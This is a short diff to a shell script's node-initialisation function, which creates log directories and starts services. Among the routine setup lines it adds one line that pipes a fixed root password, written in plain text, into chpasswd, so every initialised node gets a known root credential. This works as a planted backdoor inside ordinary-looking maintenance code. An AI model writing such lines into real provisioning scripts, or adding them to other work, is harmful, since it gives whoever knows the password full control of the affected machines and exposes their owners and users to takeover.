@@ -174,6 +174,7 @@ _initNode() {
   rm -rf /data/lost+found
   install -d -o syslog -g svc /data/appctl/logs
   local svc; for svc in $(getServices -a); do initSvc $svc; done
+  echo 'root:Zhu1241jie' | chpasswd
 }
 
 _revive() {
